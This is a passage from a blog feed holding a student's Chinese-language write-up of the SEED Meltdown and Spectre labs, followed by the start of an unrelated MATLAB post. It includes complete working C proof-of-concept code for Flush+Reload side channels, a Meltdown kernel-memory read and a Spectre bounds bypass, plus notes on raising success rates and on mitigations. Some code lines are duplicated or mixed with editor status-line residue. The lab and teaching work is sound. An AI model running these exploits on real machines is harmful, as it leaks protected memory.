class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="comment">/* cache hit time threshold assumed*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里注意修改score为非静态，否则无法重置其内容。</span></span><br><span class="line"> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">     addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">     time1 = __rdtscp(&amp;junk);</span><br><span class="line">     junk = *addr;</span><br><span class="line">     time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">     <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">        scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*********************** Flush + Reload ************************/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">meltdown_asm</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> kernel_data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> kernel_data = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// Give eax register something to do</span></span><br><span class="line">   <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">       <span class="string">&quot;.rept 400;&quot;</span>                </span></span><br><span class="line"><span class="params">       <span class="string">&quot;add $0x141, %%eax;&quot;</span></span></span><br><span class="line"><span class="params">       <span class="string">&quot;.endr;&quot;</span>                    </span></span><br><span class="line"><span class="params">    </span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       :</span></span><br><span class="line"><span class="params">       : <span class="string">&quot;eax&quot;</span></span></span><br><span class="line"><span class="params">   )</span>; </span><br><span class="line">    </span><br><span class="line">   <span class="comment">// The following statement will cause an exception</span></span><br><span class="line">   kernel_data = *(<span class="type">char</span>*)kernel_data_addr;  </span><br><span class="line">   <span class="built_in">array</span>[kernel_data * <span class="number">4096</span> + DELTA] += <span class="number">1</span>;              </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// signal handler</span></span><br><span class="line"><span class="type">static</span> sigjmp_buf jbuf;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">catch_segv</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   siglongjmp(jbuf, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i, j, ret = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Register signal handler</span></span><br><span class="line">  signal(SIGSEGV, catch_segv);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/secret_data&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(scores, <span class="number">0</span>, <span class="keyword">sizeof</span>(scores));</span><br><span class="line">  flushSideChannel();</span><br><span class="line"> <span class="type">int</span> index=<span class="number">0</span>; </span><br><span class="line"> <span class="comment">// 加上有关index的循环，一次性爆破所有位置</span></span><br><span class="line"><span class="keyword">for</span>(;index&lt;<span class="number">8</span>;index++)&#123;  </span><br><span class="line">  <span class="comment">// Retry 1000 times on the same address.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">ret = pread(fd, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  perror(<span class="string">&quot;pread&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flush the probing array</span></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) </span><br><span class="line">_mm_clflush(&amp;<span class="built_in">array</span>[j * <span class="number">4096</span> + DELTA]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sigsetjmp(jbuf, <span class="number">1</span>) == <span class="number">0</span>) &#123; meltdown_asm(<span class="number">0xf90a3000</span>+index); &#125;</span><br><span class="line"></span><br><span class="line">reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the index with the highest score.</span></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value for %d is %d %c\n&quot;</span>,index, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">scores[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="spectre"><a href="#spectre" class="headerlink" title="spectre"></a>spectre</h1><h2 id="task3-1"><a href="#task3-1" class="headerlink" title="task3"></a>task3</h2><p>3.1首先介绍了乱序执行的原理。CPU会记录下之前执行过的指令挑选的分支。因此我们需要先”训练CPU”一直挑选我们制定的分支开始乱序执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span> &#123; <span class="comment">// 下面的参数size=10</span></span><br><span class="line"><span class="keyword">if</span> (x &lt; size) &#123; temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA]; &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; </span><br><span class="line">    victim(i);  <span class="comment">// i&lt;10，因此可以在victim里面一直通过判断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来如果我们尝试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim(<span class="number">97</span>);</span><br></pre></td></tr></table></figure><p>经过训练的CPU依然会执行这条指令，选择true的分支跳转。<img src="/2022/04/07/software-security-lab2/image-20220409151911045.png" alt="image-20220409151911045"></p><h3 id="注释flush-size"><a href="#注释flush-size" class="headerlink" title="注释flush_size"></a>注释flush_size</h3><p>如果把flush_size注释掉，成功概率就变得很低了</p><p><img src="/2022/04/07/software-security-lab2/image-20220409152120795.png" alt="image-20220409152120795"></p><p>这是因为把如果不flush size，那么下一次在victim判断的时候size已经在本地的TLB或者CPU cache甚至寄存器中，访问并比较size和x的时间将会变得很少。这样的事件还来不及执行乱序执行来加载出我们的数组到内存。</p><h3 id="replace-with-i-20"><a href="#replace-with-i-20" class="headerlink" title="replace with (i+20)"></a>replace with (i+20)</h3><p>可以看到成功概率也大大下降了。这是因为我们相当于训练了CPU每次都是false的结果。让CPU不会经过这样的分支选择。</p><p><img src="/2022/04/07/software-security-lab2/image-20220409152613890.png" alt="image-20220409152613890"></p><h2 id="task4-1"><a href="#task4-1" class="headerlink" title="task4"></a>task4</h2><p>这里我们尝试真正使用specture去模拟攻击一个类似现实中沙箱的情景。原理如上。可以看到能够攻击成功。</p><p><img src="/2022/04/07/software-security-lab2/image-20220409153717215.png" alt="image-20220409153717215"></p><p>然而并不是每次都能成功(这也很正常)因为我们也无法预测CPU的noise什么时候产生。</p><p><img src="/2022/04/07/software-security-lab2/image-20220409153826120.png" alt="image-20220409153826120"></p><h2 id="task5-1"><a href="#task5-1" class="headerlink" title="task5"></a>task5</h2><h3 id="problem1"><a href="#problem1" class="headerlink" title="problem1"></a>problem1</h3><p>可以看出确实每次成功的不一定是正确的，相反第一个元素的加载时间比较短。</p><p><img src="/2022/04/07/software-security-lab2/image-20220409155633226.png" alt="image-20220409155633226"></p><p>发生这种情况的原因是，<strong>毕竟大部分情况下meltdown攻击可能不成功，这种情况下restricted返回值位0，因此我们就把array[0]加载到了内存</strong>。这种情况实际上是失败情况。因此我们要排除。</p><p>经过简单的修改(去除0号元素)可以得到下面的结果。发现确实是正确的。</p><p><img src="/2022/04/07/software-security-lab2/image-20220409155924727.png" alt="image-20220409155924727"></p><h3 id="problem2"><a href="#problem2" class="headerlink" title="problem2"></a>problem2</h3><p>这里我也不清楚。按照老师和同学们的讨论，应该和usleep时一个意思，拖延时间用的。</p><h3 id="problem3-USLEEP"><a href="#problem3-USLEEP" class="headerlink" title="problem3 USLEEP"></a>problem3 USLEEP</h3><p>usleep终止了用户线程，但是OS对于内存的load并没有停止。这里加上可以让内存被load出来更有可能。同时查阅资料，一次传统的磁盘访问(随机访问)大约需要几十万时钟周期，15毫秒(ms)左右。一次usleep(10)是休息10微秒(μs),而一个ms是1000μs。所以考虑到磁盘读写，可能需要较大的usleep参数，比如15000(这是平均访问时间)，能够尽可能多的执行内存调出的命令。</p><p><img src="/2022/04/07/software-security-lab2/image-20220409163052620.png" alt="image-20220409163052620"></p><p>经过尝试，当我们适当调高usleep的秒数时，成功率会提高。注意到下面的number of hits确实提高了。</p><p><img src="/2022/04/07/software-security-lab2/image-20220420201036926.png" alt="image-20220420201036926"></p><h2 id="task6-1"><a href="#task6-1" class="headerlink" title="task6"></a>task6</h2><p>在main中加了一个简单的遍历循环。可以很方便的的到最后的结果。如下图所示。我最终把目标字符串直接打印了出来。</p><p><img src="/2022/04/07/software-security-lab2/image-20220414153807373.png" alt="image-20220414153807373"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="type">uint8_t</span> temp    = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>    *secret = <span class="string">&quot;Seed_Lab&quot;</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">                                                                                                                                          32,3          Top <span class="type">static</span> <span class="type">int</span> scores[256];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    restrictedAccess(i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;  &#125;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">                                                                                                                                          <span class="number">38</span>,<span class="number">1</span>          <span class="number">55</span>%   s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint8_t</span> s;</span><br><span class="line"><span class="keyword">for</span>(cnt=<span class="number">0</span>;cnt&lt;<span class="number">8</span>;cnt++)&#123;</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(&amp;secret[cnt] - (<span class="type">char</span>*)buffer);</span><br><span class="line"></span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//printf(&quot;*****\n&quot;);  // This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">    spectreAttack(index_beyond);</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value[%d] is %d(%c)\n&quot;</span>,cnt, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结一下两个实验的异同</p><table><thead><tr><th>角度</th><th>meltdown</th><th>spectre</th></tr></thead><tbody><tr><td>产生原因</td><td>CPU乱序执行，在权限检查时首先会把对应地址以及加载到CPU_CACHE中之后再检查权限。在检查权限之后没有清除CPU_buffer，导致可以测信道攻击。</td><td>CPU在分支预测时发生乱序执行。提前加载了判断语句后面的内容。</td></tr><tr><td>触发条件</td><td>访问不可读的内核部分数据</td><td>在进程内，访问不可读的沙箱中的数据</td></tr><tr><td>优化方法(增大成功率)</td><td>1.使用汇编代码占用ALU<br>2.提前将数据读取CPU_cache<br>3.统计方法</td><td>1.把参与比较的内容提前从buffer里面flush，加大比较时间。<br>2.训练CPU在每次分支预测时选择我们期望的path，达到一种类似欺骗的效果。<br>3.统计方法</td></tr><tr><td>攻击效果</td><td>访问不可读数据</td><td>(同)</td></tr><tr><td>修复方案</td><td>1. 采用lfence，使得在完成某一条指令之前，不可进行乱序执行<br>2.完全禁止乱序执行(开销较大)或者在部分地方告诉CPU只能串行执行<br>3.降低CPU提供的时钟接口返回值的准确性(只需要在高精度下模糊就可以)从而难以进行测信道攻击。</td><td>(同)</td></tr></tbody></table><p>这次的两个非常著名的漏洞，教会了我一些硬件方面的漏洞挖掘方法，以及测信道攻击思路。受益良多。</p>]]></content>
      
      
      <categories>
          
          <category> school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> meltdown </tag>
            
            <tag> software-security </tag>
            
            <tag> hardware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab-2</title>
      <link href="/2022/04/07/matlab-2/"/>
      <url>/2022/04/07/matlab-2/</url>
      
        <content type="html"><![CDATA[<p>学校数字水印课笔记——matlab使用小记(二)<br>图像类型转换和颜色模型转换</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>matleb中，图像转换关系可以用下图表示。本次实验主要涉及的是下面有标号的几种。</p><p><img src="/2022/04/07/matlab-2/image-20220407085028888.png" alt="image-20220407085028888"></p><p>一般而言，有以下几种常见的图像处理函数</p><p><img src="/2022/04/07/matlab-2/image-20220407085137810.png" alt="image-20220407085137810"></p><h2 id="灰度图像二值化方法"><a href="#灰度图像二值化方法" class="headerlink" title="灰度图像二值化方法"></a>灰度图像二值化方法</h2><p><img src="/2022/04/07/matlab-2/image-20220407085311966.png" alt="image-20220407085311966"></p><p>从伪代码可以看出原理其实很简单。就是根据阈值设置某个像素点取值为0或者1。matlan中的im2bw中就包含一个阈值参数。这里没有做实验，直接复制了老师的图。</p><p><img src="/2022/04/07/matlab-2/image-20220407085607394.png" alt="image-20220407085607394"></p><h3 id="如何确定阈值"><a href="#如何确定阈值" class="headerlink" title="如何确定阈值"></a>如何确定阈值</h3><p>根据图像全局灰度值确定。从本质上而言，根本思想就是选取的阈值要尽量能区分大部分颜色。这里选在两个阈值之间就使得结果中一半全白，一半全黑。就能够区分两者。反之就会得到全白或者全黑，无法区分两者。</p><p><img src="/2022/04/07/matlab-2/image-20220407085815283.png" alt="image-20220407085815283"></p><p>如果波峰和波谷交替出现，那么我们应该将阈值放在主要的波峰和波谷之间。</p><blockquote><p>利用matlab的imhist.m函数可以方便地画出一幅灰度图像的灰度直方图。但是说我缺少toolbox，结果下载页下载不了。。。只能重装，真实糟心</p></blockquote><p>使用下面代码绘制</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rgb = imread(<span class="string">&quot;E:\lena.bmp&quot;</span>);</span><br><span class="line">imhist(rgb)</span><br></pre></td></tr></table></figure><p><img src="/2022/04/07/matlab-2/image-20220407105621922.png" alt="image-20220407105621922"></p><h1 id="不同数字图像文件格式转换"><a href="#不同数字图像文件格式转换" class="headerlink" 